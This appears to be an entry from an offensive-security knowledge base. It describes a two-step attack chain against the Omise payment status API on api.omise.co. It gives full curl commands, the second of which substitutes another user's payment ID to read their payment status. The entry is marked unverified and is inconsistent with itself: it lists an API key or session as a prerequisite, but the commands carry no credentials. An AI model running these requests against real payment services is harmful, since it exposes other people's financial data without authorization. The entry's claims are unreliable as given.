---
tags:
  - idor
  - payment-api
  - omise
  - web
  - unauthorized-access
type: attack_chain
tools: []
tactics:
  - '[[Discovery]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-IDOR-in-Omise-Payment-Status-API]]'
step_count: 2
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:33.736Z'
description: >-
  Demonstrates exploitation of an Insecure Direct Object Reference (IDOR)
  vulnerability in the Omise payment status API, allowing unauthorized viewing
  of other users' payment details.
skill_level: intermediate
impact_level: high
id: 65dcf269-92d7-4c42-bf26-44211f4fa17d
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# IDOR in Omise Payment API to Access Other Users' Payment Status

Multi-stage attack chain demonstrating exploitation of an IDOR vulnerability in the Omise payment API endpoint, enabling attackers to view sensitive payment status information from other users' accounts without authentication checks.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Baseline Request to Own Payment] --> B[Modify Payment ID for Unauthorized Access]
    B --> C[Retrieve Other User's Payment Status]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Web platform
- Omise Payment API service on api.omise.co
- Network access to HTTPS endpoint (port 443 implied)

### Initial Access Requirements

- Valid authenticated session or API key for initial baseline request
- Knowledge of a valid own payment ID
- Guessed or enumerated payment ID from another user (e.g., via sequential guessing or logs)

## Detailed Attack Procedures

### Step 1: Baseline Request to Own Payment Status
procedure: [[procedures/Exploit-IDOR-in-Omise-Payment-Status-API]]

**Objective**: Establish a valid request to retrieve the attacker's own payment status, confirming API functionality and capturing necessary headers.

**Instructions**: Use [[commands/omise-retrieve-own-payment-status]] to send a GET request to the /payments/{payment_id}/status endpoint with your own valid payment ID.

```bash
curl -X GET "https://api.omise.co/payments/paym_test_xxxx/status" \
  -H "Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" \
  -H "Sec-Ch-Ua-Mobile: ?0" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36" \
  -H "Sec-Ch-Ua-Platform: \"macOS\"" \
  -H "Accept: */*" \
  -H "Sec-Fetch-Site: same-origin" \
  -H "Sec-Fetch-Mode: cors" \
  -H "Sec-Fetch-Dest: empty" \
  -H "Referer: https://api.omise.co/" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Connection: close"
```

**Expected Output**: HTTP/2 200 OK response with JSON body like {"processed":true}, confirming the endpoint works for authorized access.

**Success Indicators**:
- 200 OK status code
- JSON response indicating payment status

### Step 2: Exploit IDOR by Accessing Unauthorized Payment Status
procedure: [[procedures/Exploit-IDOR-in-Omise-Payment-Status-API]]

**Objective**: Modify the payment ID to one belonging to another user, demonstrating lack of ownership validation and unauthorized data access.

**Instructions**: Use [[commands/omise-retrieve-unauthorized-payment-status]] by replacing the payment ID in the path with a target user's ID (e.g., paym_test_xxx) and resend the request with the same headers.

```bash
curl -X GET "https://api.omise.co/payments/paym_test_xxx/status" \
  -H "Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" \
  -H "Sec-Ch-Ua-Mobile: ?0" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36" \
  -H "Sec-Ch-Ua-Platform: \"macOS\"" \
  -H "Accept: */*" \
  -H "Sec-Fetch-Site: same-origin" \
  -H "Sec-Fetch-Mode: cors" \
  -H "Sec-Fetch-Dest: empty" \
  -H "Referer: https://api.omise.co/" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Connection: close"
```

**Expected Output**: HTTP/2 200 OK with JSON {"processed":true} if the ID is valid, or 404 if invalid, without requiring authentication for the target payment.

**Success Indicators**:
- 200 OK for unauthorized payment ID
- Exposure of sensitive payment status details

## Attack Chain Summary

### Key Achievements

1. Confirmed API endpoint accessibility with own credentials
2. Bypassed ownership checks to access other users' payment data
3. Exposed potential sensitive financial information like payment processing status

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Account Discovery]]

### MITRE ATT&CK Tactics

- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
